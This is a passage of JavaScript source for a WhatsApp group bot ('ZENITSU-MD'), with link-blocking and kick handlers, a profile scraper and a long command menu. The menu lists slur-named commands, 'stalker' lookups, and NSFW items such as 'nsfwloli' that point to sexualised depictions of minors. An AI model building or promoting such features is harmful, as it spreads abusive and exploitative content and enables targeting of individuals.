        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is specifically for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await DeepakBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await DeepakBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await DeepakBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return DeepakBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return DeepakBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (DeepakTheCreator) return DeepakBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
        if (DeepakBotInc)
			for (let anju of deepakezzyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./DeepakMedia/audio/${anju}.mp3`)
					DeepakBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}		

 // Antiwame by Deepak
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
kice = m.sender
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
kice = m.sender
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by Deepak
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by Deepak
if (antiToxic)
if (BadDeepak.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by Deepak
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by Deepak
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by Deepak
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by Deepak
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by Deepak
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by Deepak
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by Deepak
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by Deepak
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (DeepakTheCreator) return m.reply(bvl)
        await DeepakBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DeepakBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DeepakBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
DeepakBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
DeepakBotInc.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyDeepakBotIncList(chath, dblist)) {
var getraindata = getDataDeepakBotIncList(chath, dblist)
if (getraindata.isImage === false) {
DeepakBotInc.sendMessage(m.chat, { text: sendDeepakBotIncList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
DeepakBotInc.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
DeepakBotInc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

switch (command) {
	case 'public': {
                if (!DeepakTheCreator) return replygcdeepak(mess.owner)
                DeepakBotInc.public = true
                replygcdeepak('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
                if (!DeepakTheCreator) return replygcdeepak(mess.owner)
                DeepakBotInc.public = false
                replygcdeepak('*Successful in Changing To Self Usage*')
            }
            break
case 'rentbot': {
if (m.isGroup) return replygcdeepak(mess.private)
if (!isPrem) return replyprem(mess.premium)
rentfromdeepak(DeepakBotInc, m, from)
}
break
case 'rentbotlist': 
try {
let user = [... new Set([...global.conns.filter(DeepakBotInc => DeepakBotInc.user).map(DeepakBotInc => DeepakBotInc.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await DeepakBotInc.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
DeepakBotInc.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcdeepak(`There are no users who have rented the bot yet`)
}
break
case 'shutdown':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
replygcdeepak(`Ba bye...`)
await sleep(3000)
process.exit()
break
case 'owner': {
const repf = await DeepakBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
DeepakBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            deepakezy = `
*𝗭𝗘𝗡𝗜𝗧𝗦𝗨-𝗠𝗗 𝗠𝗘𝗡𝗨* 
*Hi👋, ${pushname}, ${deepaktimewisher}}️*

╔═══❑𝗨𝗦𝗘𝗥-𝗜𝗡𝗙𝗢❑════❀
║🙇𝙽𝚊𝚖𝚎 : ${pushname}
║📠𝙽𝚞𝚖𝚋𝚎𝚛 : @${me.split('@')[0]}
║🟥𝙿𝚛𝚎𝚖𝚒𝚞𝚖 : ${isPrem ? '✅' : `❌`}
╚══════════════❀
╔═══❑𝗧𝗜𝗠𝗘-𝗜𝗡𝗙𝗢❑════❀
║⌚𝚃𝚒𝚖𝚎 : ${xtime}
║🗓️𝙳𝚊𝚝𝚎 : ${xdate} 
╚══════════════❀
╔═══❑𝗕𝗢𝗧-𝗜𝗡𝗙𝗢❑════❀
║🪀️𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 3.0.0
║🚅𝚂𝚙𝚎𝚎𝚍 : ${latensie.toFixed(4)} miliseconds
║⏰𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
║🤖𝙱𝚘𝚝 : ${global.botname}
║💬𝙾𝚠𝚗𝚎𝚛 : ${ownernumber}
║💡𝙼𝚘𝚍𝚎 : ${DeepakBotInc.public ? 'Public' : `Self`}
║🖥️𝙷𝚘𝚜𝚝 𝙽𝚊𝚖𝚎 : ${os.hostname()}
║📱𝙿𝚕𝚊𝚝𝚏𝚘𝚛𝚖 : ${os.platform()}
╚═════════════════❀ 
╔═════════════════❀
║𝗭𝗘𝗡𝗜𝗧𝗦𝗨-𝗠𝗗 𝗠𝗘𝗡𝗨
╚═════════════════❀
╔══ꪶOwner Menuꫂ═══❀
║❒✗.self 
║❒✗.public 
║❒✗.join 
║❒✗.bctext 
║❒✗.bcimage 
║❒✗.bcvideo 
║❒✗.creategc 
║❒✗.setexif 
║❒✗.shutdown 
║❒✗.autostickergc 
║❒✗.setppbot 
║❒✗.addprem 
║❒✗.delprem 
║❒✗.addowner 
║❒✗.delowner 
║❒✗.addvn 
║❒✗.delvn 
║❒✗.addsticker 
║❒✗.delsticker 
║❒✗.addimage 
║❒✗.delimage 
║❒✗.addvideo 
║❒✗.delvideo 
║❒✗.block add 
║❒✗.unblock del 
║❒✗.leavegc 
╚═════════════════❀

╔══ꪶDownload Menuꫂ═══❀
║❒✗.tiktokvideo 
║❒✗.tiktokaudio 
║❒✗.ytsearch 
║❒✗.mediafire 
║❒✗.play 
║❒✗.ytmp3 
║❒✗.ytmp4 
║❒✗.google 
║❒✗.spotify 
║❒✗.gitclone 
║❒✗.happymod 
╚═════════════════❀

╔══ꪶGroup Menuꫂ═══❀
║❒✗.antilink 
║❒✗.antiwame 
║❒✗.grouplink 
║❒✗.ephemeral 
║❒✗.delete 
║❒✗.setppgroup 
║❒✗.setname 
║❒✗.setdesc 
║❒✗.add 
║❒✗.kick 
║❒✗.promote 
║❒✗.demote 
║❒✗.hidetag 
║❒✗.tagall 
║❒✗.editinfo 
║❒✗.opentime 
║❒✗.closetime 
║❒✗.resetlink 
║❒✗.autostickerpc 
║❒✗.antilinkgc 
║❒✗.antiwame 
║❒✗.antilinkall 
║❒✗.antilinktiktok 
║❒✗.antilinkfb 
║❒✗.antilinktwitter 
║❒✗.antilinkig 
║❒✗.antlinktg 
║❒✗.antilinkytvid 
║❒✗.antilinkytch 
║❒✗.antivirus 
║❒✗.antitoxic 
║❒✗.nsfw 
║❒✗.react 
╚═════════════════❀

╔══ꪶRandom Videoꫂ═══❀
║❒✗.tiktokgirl 
║❒✗.tiktoknukthy 
║❒✗.tiktokkayes 
║❒✗.tiktokpanrika 
║❒✗.tiktoknotnot 
║❒✗.tiktokghea 
║❒✗.tiktoksantuy 
║❒✗.tiktokbocil 
╚═════════════════❀

╔══ꪶStalkerꫂ═══❀
║❒✗.igstalk 
║❒✗.ffstalk 
║❒✗.mlstalk 
║❒✗.npmstalk 
║❒✗.ghstalk 
╚═════════════════❀

╔══ꪶOther Menuꫂ═══❀
║❒✗.ping 
║❒✗.menu 
║❒✗.listpem 
║❒✗.liststicker 
║❒✗.listimage 
║❒✗.listvideo 
║❒✗.listvn 
║❒✗.listbadword 
║❒✗.listpc 
║❒✗.listgc 
║❒✗.owner 
║❒✗.rentbot 
║❒✗.listrentbot 
║❒✗.donate 
║❒✗.friend 
║❒✗.obfuscate 
║❒✗.styletext 
║❒✗.fliptext 
║❒✗.tts 
║❒✗.say 
║❒✗.togif 
║❒✗.toqr 
║❒✗.bass 
║❒✗.blown 
║❒✗.deep 
║❒✗.earrape 
║❒✗.fast 
║❒✗.fat 
║❒✗.nightcore 
║❒✗.reverse 
║❒✗.robot 
║❒✗.slow 
║❒✗.smooth 
║❒✗.squirrel 
║❒✗.tinyurl 
║❒✗.tinyurl 
║❒✗.tourl 
║❒✗.tovn 
║❒✗.toaudio 
║❒✗.tomp3 
║❒✗.tomp4
║❒✗.toimg 
║❒✗.toonce 
║❒✗.sticker 
║❒✗.take 
║❒✗.emoji 
║❒✗.volume 
║❒✗.ebinary 
║❒✗.dbinary 
║❒✗.ssweb 
║❒✗.quoted 
║❒✗.runtime 
║❒✗.sound1 - sound161 
╚═════════════════❀

╔══ꪶFun Menuꫂ═══❀
║❒✗.define 
║❒✗.truth 
║❒✗.dare 
║❒✗.couple 
║❒✗.soulmate 
║❒✗.stupidcheck 
║❒✗.handsomecheck 
║❒✗.uncleancheck 
║❒✗.hotcheck 
║❒✗.smartcheck 
║❒✗.greatcheck 
║❒✗.evilcheck 
║❒✗.dogcheck 
║❒✗.coolcheck 
║❒✗.waifucheck 
║❒✗.awesomecheck 
║❒✗.gaycheck 
║❒✗.cutecheck 
║❒✗.lesbiancheck 
║❒✗.hornycheck 
║❒✗.prettycheck 
║❒✗.lovelycheck 
║❒✗.uglycheck 
║❒✗.hot 
║❒✗.sexy 
║❒✗.kind 
║❒✗.idiot 
║❒✗.handsome 
║❒✗.beautiful 
║❒✗.cute 
║❒✗.pretty 
║❒✗.lesbian 
║❒✗.noob 
║❒✗.bastard 
║❒✗.foolish 
║❒✗.nerd 
║❒✗.asshole 
║❒✗.gay 
║❒✗.smart 
║❒✗.stubble 
║❒✗.doggo 
║❒✗.horny 
║❒✗.cunt 
║❒✗.wibu 
║❒✗.noobra 
║❒✗.nibba 
║❒✗.nibbi 
║❒✗.comrade 
║❒✗.mumu 
║❒✗.rascal 
║❒✗.scumbag  
║❒✗.nuts 
║❒✗.fagot 
║❒✗.scoundrel 
║❒✗.ditch 
║❒✗.dope 
║❒✗.gucci 
║❒✗.lit 
║❒✗.dumbass 
║❒✗.crackhead 
║❒✗.mf 
║❒✗.motherfucker 
║❒✗.sucker 
║❒✗.fuckboy 
║❒✗.playboy 
║❒✗.fuckgirl 
║❒✗.playgirl 
║❒✗.quotes 
║❒✗.can 
║❒✗.is 
║❒✗.when 
║❒✗.where 
║❒✗.what 
║❒✗.how 
║❒✗.rate 
║❒✗.cry 
║❒✗.kill 
║❒✗.hug 
║❒✗.pat 
║❒✗.lick  
║❒✗.kiss 
║❒✗.bite 
║❒✗.yeet 
║❒✗.bully 
║❒✗.bonk 
║❒✗.wink 
║❒✗.poke 
║❒✗.nom 
║❒✗.slap 
║❒✗.smile  
║❒✗.wave 
║❒✗.awoo 
║❒✗.blush 
║❒✗.smug 
║❒✗.glomp  
║❒✗.happy 
║❒✗.dance 
║❒✗.cringe 
║❒✗.cuddle 
║❒✗.highfive  
║❒✗.shinobu 
║❒✗.handhold 
║❒✗.horny 
║❒✗.checkme 
║❒✗.confess 
║❒✗.leave 
╚═════════════════❀

╔══ꪶRandom Photoꫂ═══❀
║❒✗.aesthetic 
║❒✗.coffee 
║❒✗.wikimedia 
║❒✗.wallpaper 
║❒✗.art 
║❒✗.bts 
║❒✗.woof 
║❒✗.meow 
║❒✗.lizard 
║❒✗.cosplay 
║❒✗.hacker 
║❒✗.cyber 
║❒✗.gamewallpaper 
║❒✗.islamic 
║❒✗.jennie 
║❒✗.jiso 
║❒✗.satanic 
║❒✗.justina 
║❒✗.cartoon 
║❒✗.pentol 
║❒✗.cat 
║❒✗.kpop 
║❒✗.exo 
║❒✗.lisa 
║❒✗.space 
║❒✗.car 
║❒✗.technology 
║❒✗.bike 
║❒✗.shortquote 
║❒✗.antiwork 
║❒✗.hacking 
║❒✗.boneka 
║❒✗.rose 
║❒✗.ryujin 
║❒✗.ulzzangboy 
║❒✗.ulzzanggirl 
║❒✗.wallml 
║❒✗.wallphone 
║❒✗.mountain 
║❒✗.goose 
║❒✗.profilepic 
║❒✗.couplepic 
║❒✗.programming 
║❒✗.pubg 
║❒✗.blackpink 
║❒✗.randomboy   
║❒✗.randomgirl 
║❒✗.hijab   
║❒✗.chinese 
║❒✗.indo 
║❒✗.japanese 
║❒✗.korean 
║❒✗.malay 
║❒✗.thai 
║❒✗.vietnamese 
╚═════════════════❀

╔══ꪶAnimeꫂ═══❀
║❒✗.akira 
║❒✗.akiyama 
║❒✗.ana 
║❒✗.asuna 
║❒✗.ayuzawa 
║❒✗.boruto 
║❒✗.chiho 
║❒✗.chitoge 
║❒✗.cosplayloli 
║❒✗.cosplaysagiri 
║❒✗.deidara 
║❒✗.doraemon 
║❒✗.elaina 
║❒✗.emilia 
║❒✗.erza 
║❒✗.gremory 
║❒✗.hestia 
║❒✗.hinata 
║❒✗.husbu 
║❒✗.inori 
║❒✗.isuzu 
║❒✗.itachi 
║❒✗.itori 
║❒✗.kaga 
║❒✗.kagura 
║❒✗.kakasih 
║❒✗.kaori 
║❒✗.keneki 
║❒✗.kotori 
║❒✗.kurumi 
║❒✗.loli 
║❒✗.madara 
║❒✗.megumin 
║❒✗.mikasa 
║❒✗.mikey 
║❒✗.miku 
║❒✗.minato 
║❒✗.naruto 
║❒✗.neko 
║❒✗.neko2 
║❒✗.nekonime 
║❒✗.nezuko 
║❒✗.onepiece 
║❒✗.pokemon 
║❒✗.randomnime 
║❒✗.randomnime2 
║❒✗.rize 
║❒✗.sagiri 
║❒✗.sakura 
║❒✗.sasuke 
║❒✗.shina 
║❒✗.shinka 
║❒✗.shinomiya 
║❒✗.shizuka 
║❒✗.shota 
║❒✗.tejina 
║❒✗.toukachan 
║❒✗.tsunade 
║❒✗.waifu 
║❒✗.animewall 
║❒✗.yotsuba 
║❒✗.yuki 
║❒✗.yulibocil 
║❒✗.yumeko 
║❒✗.8ball 
║❒✗.tickle 
║❒✗.gecg 
║❒✗.feed 
╚═════════════════❀

╔══ꪶAnime NSFWꫂ═══❀
║❒✗.hentai 
║❒✗.gifhentai 
║❒✗.gifblowjob 
║❒✗.hentaivid 
║❒✗.hneko 
║❒✗.nwaifu 
║❒✗.animespank 
║❒✗.trap 
║❒✗.gasm 
║❒✗.ahegao 
║❒✗.ass 
║❒✗.bdsm 
║❒✗.blowjob 
║❒✗.cuckold 
║❒✗.cum 
║❒✗.milf 
║❒✗.eba 
║❒✗.ero 
║❒✗.femdom 
║❒✗.foot 
║❒✗.gangbang 
║❒✗.glasses 
║❒✗.jahy 
║❒✗.masturbation 
║❒✗.manga 
║❒✗.neko-hentai 
║❒✗.neko-hentai2 
║❒✗.nsfwloli 
║❒✗.orgy 
║❒✗.panties  
║❒✗.pussy 
║❒✗.tentacles 
║❒✗.thights 
║❒✗.yuri 
║❒✗.zettai 
╚═════════════════❀

╔══ꪶTextpro Makerꫂ═══❀
║❒✗.candy  
║❒✗.christmas  
║❒✗.3dchristmas  
║❒✗.sparklechristmas 
║❒✗.deepsea  
║❒✗.scifi  
║❒✗.rainbow  
║❒✗.waterpipe  
║❒✗.spooky  
║❒✗.pencil  
║❒✗.circuit  
║❒✗.discovery  
║❒✗.metalic  
║❒✗.fiction  
║❒✗.demon  
║❒✗.transformer  
║❒✗.berry  
║❒✗.thunder  
║❒✗.magma  
║❒✗.3dstone  
║❒✗.neonlight  
║❒✗.glitch  
║❒✗.harrypotter  
║❒✗.brokenglass  
║❒✗.papercut  
║❒✗.watercolor  
║❒✗.multicolor  
║❒✗.neondevil  
║❒✗.underwater  
║❒✗.graffitibike 
║❒✗.snow  
║❒✗.cloud  
║❒✗.honey  
║❒✗.ice  
║❒✗.fruitjuice  
║❒✗.biscuit  
║❒✗.wood  
║❒✗.chocolate  
║❒✗.strawberry  
║❒✗.matrix  
║❒✗.blood  
║❒✗.dropwater  
║❒✗.toxic  
║❒✗.lava  
║❒✗.rock  
║❒✗.bloodglas  
║❒✗.hallowen  
║❒✗.darkgold  
║❒✗.joker  
║❒✗.wicker 
║❒✗.firework  
║❒✗.skeleton  
║❒✗.blackpink  
║❒✗.sand  
║❒✗.glue  
║❒✗.1917  
║❒✗.leaves 
╚═════════════════❀

╔══ꪶPhotoOxy Makerꫂ═══❀
║❒✗.shadow  
║❒✗.write  
║❒✗.romantic  
║❒✗.burnpaper 
║❒✗.smoke  
║❒✗.narutobanner  
║❒✗.love  
║❒✗.undergrass 
║❒✗.doublelove  
║❒✗.coffecup 
║❒✗.underwaterocean 
║❒✗.smokyneon 
║❒✗.starstext 
║❒✗.rainboweffect 
║❒✗.balloontext 
║❒✗.metalliceffect 
║❒✗.embroiderytext 
║❒✗.flamingtext 
║❒✗.stonetext 
║❒✗.writeart 
║❒✗.summertext 
║❒✗.wolfmetaltext 
║❒✗.nature3dtext 
║❒✗.rosestext 
║❒✗.naturetypography 
║❒✗.quotesunder 
║❒✗.shinetext 
╚═════════════════❀

